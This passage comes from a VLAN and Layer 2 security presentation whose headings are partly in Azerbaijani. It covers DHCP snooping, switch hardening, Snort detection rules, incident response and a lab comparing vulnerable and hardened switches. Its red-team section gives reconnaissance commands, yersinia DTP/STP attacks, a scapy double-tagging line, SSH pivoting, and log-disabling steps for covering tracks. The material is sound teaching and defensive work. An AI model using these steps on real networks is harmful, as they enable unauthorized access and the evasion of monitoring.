**DHCP Snooping Operation:**
```
1. DHCP packet on untrusted port
2. Check: Is it OFFER/ACK from server?
3. NO → Drop (rogue DHCP blocked)
4. YES → Validate (trusted port only)
```

**Solution 2: Port Security**
```bash
# Prevent MAC flooding in DHCP starvation
interface GigabitEthernet0/1
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
```

**Solution 3: IP Source Guard**
```bash
# Bind IP to port (uses DHCP snooping table)
ip source binding 192.168.10.50 aaaa.bbbb.cccc vlan 10 interface GigabitEthernet0/1

# Dynamic (from DHCP snooping)
interface GigabitEthernet0/1
 ip verify source
```

**Solution 4: Static IP for Critical Devices**
```bash
# Avoid DHCP dependency
# Servers, routers, printers → Static IP
```

**Verification:**
```bash
# Check DHCP snooping
show ip dhcp snooping

# Check bindings
show ip dhcp snooping binding

# Port statistics
show ip dhcp snooping statistics
```

**Detection:**
```bash
# Rogue DHCP detection
%DHCP_SNOOPING-5-DHCP_SNOOPING_UNTRUSTED_PORT

# Monitor DHCP traffic
debug ip dhcp server events
```

---

## **SƏHİFƏ 15: RED TEAM METHODOLOGY**

### **Reconnaissance Phase**

**Goal:** Network mapping və VLAN discovery

**Step 1: Passive Information Gathering**

**CDP/LLDP Sniffing:**
```bash
# Capture CDP packets (Cisco Discovery Protocol)
sudo tcpdump -i eth0 -nn -v -c 1 'ether[20:2] == 0x2000'

# LLDP (Link Layer Discovery Protocol)
sudo tcpdump -i eth0 -nn -v -c 1 'ether proto 0x88cc'

# Info: Switch model, IOS version, VLAN info
```

**Tools:**
```bash
# cdpsnarf
sudo apt install cdpsnarf
sudo cdpsnarf -i eth0

# Output:
# Device: Switch-1
# Platform: Cisco 2960
# Native VLAN: 1
# VTP Domain: COMPANY
```

---

**Step 2: Active Network Discovery**

**VLAN Identification:**
```bash
# ARP scan different subnets
for i in {1..254}; do
  sudo arping -c 1 192.168.10.$i &
  sudo arping -c 1 192.168.20.$i &
  sudo arping -c 1 192.168.30.$i &
done

# Identify active subnets = VLANs
```

**SNMP Enumeration:**
```bash
# VLAN info via SNMP (if community string known)
snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.17.7.1.4.3

# Output: VLAN list, port assignments
```

---

**Step 3: Switch Fingerprinting**

```bash
# Nmap
sudo nmap -sV -O 192.168.1.1

# Banner grabbing
telnet 192.168.1.1
# or
nc 192.168.1.1 22
```

---

**Step 4: Topology Mapping**

**Tool: NetDisco / LANsweeper**
```bash
# Build network diagram
# Switches, routers, VLANs
# Trunk links, access ports
```

**Manual Traceroute:**
```bash
# Inter-VLAN routing paths
traceroute -I 192.168.20.1
traceroute -I 192.168.30.1

# Identify Layer 3 devices
```

---

### **Attack Decision Tree**

```
[Network Access Achieved]
        ↓
  [Reconnaissance]
        ↓
   Port Type?
    ↙      ↘
Access      Trunk
  ↓          ↓
DTP enabled? [Already multi-VLAN]
 ↙  ↘          ↓
Yes  No    Exploit inter-VLAN
 ↓    ↓
Switch  Double Tagging
Spoofing   Attack
 ↓
[Multi-VLAN Access]
 ↓
STP active?
 ↙   ↘
Yes   No
 ↓     ↓
Root  Continue
Bridge
Attack
 ↓
[MITM Position]
 ↓
VTP domain?
 ↙   ↘
Yes   No
 ↓     ↓
VTP  Skip
Injection
 ↓
[Network Chaos / Recon Phase]
 ↓
[Target Identification]
 ↓
[Lateral Movement]
 ↓
[Data Exfiltration]
```

---

### **Risk vs Reward Analysis**

| Attack          | Stealth | Impact | Complexity | Detection Risk |
|-----------------|---------|--------|------------|----------------|
| DTP Spoofing    | Medium  | High   | Low        | Medium         |
| Double Tagging  | High    | Medium | Medium     | Low            |
| STP Manipulation| Low     | High   | Medium     | High           |
| VTP Injection   | Low     | Very High | Low     | Very High      |
| MAC Flooding    | Low     | Medium | Low        | High           |
| ARP Spoofing    | Medium  | High   | Low        | Medium         |
| DHCP Attacks    | Low     | Very High | Medium  | High           |

**Red Team Decision:**
- **Stealth engagement:** Double Tagging, ARP Spoofing
- **Loud engagement:** VTP, MAC Flooding
- **Persistence:** DTP (long-term access)

---

### **Post-Exploitation**

**Maintaining Access Across VLANs:**

**1. Persistence Mechanisms:**
```bash
# Static virtual interfaces
# /etc/network/interfaces
auto eth0.10
iface eth0.10 inet static
  address 192.168.10.51
  netmask 255.255.255.0
  vlan-raw-device eth0

auto eth0.20
iface eth0.20 inet static
  address 192.168.20.51
  netmask 255.255.255.0
  vlan-raw-device eth0
```

**2. Pivoting Through Segments:**
```bash
# SSH tunneling
ssh -D 9050 attacker@pivot-host

# Proxychains config
# /etc/proxychains.conf
socks5 127.0.0.1 9050

# Access target VLAN
proxychains nmap 192.168.30.0/24
```

**3. Data Exfiltration Paths:**
```
Compromised Host (VLAN 10)
   ↓ (Trunk access)
VLAN 20 (Database Server)
   ↓ (Data extraction)
VLAN 30 (DMZ - Internet access)
   ↓
External Server (Attacker C2)
```

**4. Covering Tracks:**
```bash
# Clear switch logs (if access available)
# Cisco
configure terminal
no logging buffered

# Clear ARP cache
clear arp-cache

# Disable SNMP traps temporarily
no snmp-server enable traps
```

---

## **SƏHİFƏ 16-17: DEFENSE IN DEPTH STRATEGY**

### **Layered Security Approach**

```
Layer 1: Physical Security
   ↓
Layer 2: Port-Level Controls
   ↓
Layer 3: VLAN Isolation
   ↓
Layer 4: Monitoring & Detection
   ↓
Layer 5: Incident Response
```

---

### **Comprehensive Hardening Checklist**

**🔒 Port Security:**
```bash
interface range GigabitEthernet0/1-20
 switchport mode access
 switchport access vlan 10
 switchport port-security
 switchport port-security maximum 2
 switchport port-security mac-address sticky
 switchport port-security violation restrict
 spanning-tree portfast
 spanning-tree bpduguard enable
```

---

**🔒 Trunk Security:**
```bash
interface GigabitEthernet0/24
 switchport mode trunk
 switchport nonegotiate                        ← Disable DTP
 switchport trunk allowed vlan 10,20,30        ← Explicit VLANs
 switchport trunk native vlan 999              ← Unused native VLAN
 spanning-tree guard root                      ← STP protection
```

---

**🔒 Global Security Features:**
```bash
# VTP
vtp mode transparent

# DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
interface GigabitEthernet0/24
 ip dhcp snooping trust

# Dynamic ARP Inspection
ip arp inspection vlan 10,20,30
interface GigabitEthernet0/24
 ip arp inspection trust

# IP Source Guard
interface range GigabitEthernet0/1-20
 ip verify source

# Storm Control
interface range GigabitEthernet0/1-20
 storm-control broadcast level 50
 storm-control action shutdown
```

---

**🔒 Unused Ports:**
```bash
interface range GigabitEthernet0/21-48
 shutdown
 switchport mode access
 switchport access vlan 999  ← Dummy VLAN
```

---

**🔒 Management Access:**
```bash
# Dedicated management VLAN
vlan 99
 name MANAGEMENT

# Restrict management access
line vty 0 4
 access-class 10 in
 transport input ssh
 exec-timeout 5 0

# ACL for management
access-list 10 permit 10.0.0.0 0.0.0.255
access-list 10 deny any log

# Disable unnecessary services
no ip http server
no ip http secure-server
no cdp run  ← Disable CDP globally (or per-port)
no lldp run
```

---

**🔒 Logging & Monitoring:**
```bash
# Syslog
logging 192.168.100.10
logging trap informational
logging source-interface Vlan99

# SNMP v3 (not v1/v2c)
snmp-server group ADMIN v3 priv
snmp-server user admin ADMIN v3 auth sha AuthPass priv aes 128 PrivPass

# Enable relevant traps
snmp-server enable traps port-security
snmp-server enable traps config
snmp-server enable traps vtp
```

---

### **Monitoring & Detection Strategy**

**🔍 Real-Time Monitoring:**

**1. SIEM Integration:**
```
Events to Monitor:
- Port security violations
- DTP negotiation attempts
- STP topology changes
- VTP revision number changes
- Unusual ARP requests
- DHCP starvation patterns
- MAC address flapping
```

**Sample SIEM Rule (Pseudo-code):**
```
IF (event_type == "PORT_SECURITY_VIOLATION") AND
   (violation_count > 5 in 60 seconds)
THEN
   ALERT "Potential MAC flooding attack on port X"
   EXECUTE shutdown_port(port_id)
   NOTIFY security_team
```

---

**2. Network Taps & SPAN:**
```bash
# SPAN (Switch Port Analyzer)
monitor session 1 source vlan 10,20,30
monitor session 1 destination interface GigabitEthernet0/48

# Send copy of traffic to IDS/IPS
```

---

**3. IDS/IPS Signatures:**

**Snort Rules Example:**
```bash
# Detect VLAN double-tagging
alert ip any any -> any any (msg:"Double VLAN tagging detected"; 
  content:"|81 00|"; depth:2; offset:12; 
  content:"|81 00|"; depth:2; offset:16; 
  classtype:network-scan; sid:1000001;)

# Detect STP BPDU flood
alert stp any any -> any any (msg:"STP BPDU flood"; 
  threshold:type threshold, track by_src, count 50, seconds 10; 
  classtype:denial-of-service; sid:1000002;)

# Detect ARP spoofing
alert arp any any -> any any (msg:"ARP spoofing detected"; 
  arp_opcode:reply; 
  threshold:type both, track by_src, count 30, seconds 60; 
  classtype:network-scan; sid:1000003;)
```

---

**4. Baseline & Anomaly Detection:**

**Normal Baseline:**
```
- Average MAC addresses per port: 1-2
- Trunk negotiation: None
- STP topology changes: 0-1 per week
- DHCP requests per hour: 10-20
- ARP requests per host: 5-10/min
```

**Anomalies:**
```
🚨 100+ MAC addresses on one port → MAC flooding
🚨 DTP packet on access port → Potential attack
🚨 10+ STP topology changes → STP attack
🚨 500 DHCP requests in 1 min → DHCP starvation
🚨 1000 ARP requests → ARP spoofing
```

---

**5. Tools:**
```bash
# Wireshark filters
vlan && vlan  ← Double tagging
stp           ← STP traffic
arp.duplicate-address-detected  ← ARP spoofing
dhcp          ← DHCP analysis

# Network monitoring
- Nagios
- Zabbix
- PRTG Network Monitor
- SolarWinds
```

---

### **Incident Response Plan**

**🚨 Detection → Investigation → Containment → Remediation**

**Phase 1: Detection**
```
- SIEM alert triggered
- Unusual log entry
- User complaint (network slow)
```

**Phase 2: Investigation**
```bash
# Check logs
show logging | include PORT_SECURITY
show mac address-table | count

# Identify attacker port
show port-security address
show interfaces status err-disabled

# Traffic analysis
show monitor session 1
```

**Phase 3: Containment**
```bash
# Isolate attacker port
interface GigabitEthernet0/5
 shutdown

# Block MAC address
mac address-table static aaaa.bbbb.cccc vlan 10 drop

# Emergency VLAN quarantine
interface GigabitEthernet0/5
 switchport access vlan 666  ← Quarantine VLAN (no internet, isolated)
 no shutdown
```

**Phase 4: Remediation**
```bash
# Review configuration
# Patch vulnerabilities
# Update firmware
# Retrain staff

# Post-incident
# Forensic analysis
# Documentation
# Improve defenses
```

---

## **SƏHİFƏ 18: ADVANCED TOPICS**

### **Private VLAN (PVLAN)**

**Use Case:** Hosting environment, customer isolation

**Types:**
```
Promiscuous Port: Can communicate with all (gateway)
Isolated Port: Can only talk to promiscuous (customers)
Community Port: Can talk within community + promiscuous (departments)
```

**Configuration:**
```bash
# Primary VLAN
vlan 100
 private-vlan primary
 private-vlan association 101,102

# Isolated VLAN
vlan 101
 private-vlan isolated

# Community VLAN
vlan 102
 private-vlan community

# Port assignment
interface GigabitEthernet0/1
 switchport mode private-vlan host
 switchport private-vlan host-association 100 101

interface GigabitEthernet0/24
 switchport mode private-vlan promiscuous
 switchport private-vlan mapping 100 101,102
```

**Attack:** ARP manipulation to bypass isolation

---

### **802.1X Network Access Control**

**Authentication-based port security**

**Components:**
- Supplicant (client)
- Authenticator (switch)
- Authentication server (RADIUS)

**Configuration:**
```bash
# Enable globally
aaa new-model
aaa authentication dot1x default group radius

radius server RADIUS-SERVER
 address ipv4 192.168.1.10 auth-port 1812
 key SecretKey123

# Port config
interface range GigabitEthernet0/1-20
 switchport mode access
 authentication port-control auto
 dot1x pae authenticator
```

**Benefit:** Only authenticated devices get network access

---

### **Next-Gen: Software-Defined Networking (SDN)**

**Centralized Control:**
```
Traditional: Control plane in each switch
SDN: Centralized controller (OpenFlow)
```

**Security Benefits:**
- Dynamic policy enforcement
- Rapid threat response
- Micro-segmentation
- Anomaly detection

**Attack Surface:**
- Controller compromise = full network control
- OpenFlow protocol vulnerabilities

---

## **SƏHİFƏ 19: LAB DEMO / CASE STUDY**

### **Praktiki Lab Ssenari**

**Topology:**
```
[Attacker PC] ─── Port Gi0/5 (VLAN 10) ─── [Switch-1] ─── Trunk ─── [Switch-2] ─── Port Gi0/10 (VLAN 20) ─── [Target Server]
```

**Objective:** Access VLAN 20 from VLAN 10

---

**Scenario 1: Vulnerable Configuration**

**Switch Config:**
```bash
# Switch-1
interface GigabitEthernet0/5
 switchport mode dynamic auto  ← Vulnerable!

interface GigabitEthernet0/24
 switchport mode trunk
 switchport trunk native vlan 1  ← Default!
```

**Attack Steps:**
```bash
# Step 1: DTP attack
yersinia -G
# Enable trunk → SUCCESS

# Step 2: Create VLAN interfaces
sudo vlan-config add eth0 20
sudo ifconfig eth0.20 192.168.20.50/24 up

# Step 3: Access target
ping 192.168.20.100  ← Target server
nmap -sV 192.168.20.100
```

**Result:** ✅ Full access to VLAN 20 in 2 minutes

---

**Scenario 2: Hardened Configuration**

**Switch Config:**
```bash
# Switch-1
interface GigabitEthernet0/5
 switchport mode access        ← Fixed
 switchport nonegotiate        ← DTP disabled
 switchport port-security
 spanning-tree bpduguard enable

interface GigabitEthernet0/24
 switchport mode trunk
 switchport nonegotiate
 switchport trunk allowed vlan 10,20
 switchport trunk native vlan 999
 spanning-tree guard root
```

**Attack Attempt:**
```bash
# Step 1: DTP attack
yersinia -G
# Enable trunk → FAILED (no negotiation)

# Step 2: Double tagging attempt
scapy: sendp(Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(...))
# Result: Dropped (native VLAN 999, VLAN 1 not on trunk)

# Step 3: STP attack
yersinia: Claiming Root Role
# Result: Port err-disabled (BPDU Guard)
```

**Result:** ❌ All attacks blocked, port disabled

---

**Lessons Learned:**
```
✅ Default configs are dangerous
✅ Layered security works
✅ Monitoring is essential
✅ Defense in depth prevents attacks
```

---

## **SƏHİFƏ 20: CONCLUSION & RESOURCES**

### **Key Takeaways**

**🔑 Main Points:**

1. **Network segmentation ≠ automatic security**
   - VLANs provide logical separation
   - Without hardening, easily bypassed

2. **Layer 2 attacks are underestimated**
   - Most focus on Layer 3-7
   - Layer 2 gives foundation access

3. **Default configurations are dangerous**
   - DTP enabled by default
   - Native VLAN 1
   - No port security

4. **Trust-based protocols are vulnerable**
   - STP, VTP, DTP, ARP, DHCP
   - Authentication often missing

5. **Defense in depth is essential**
   - No single solution

---
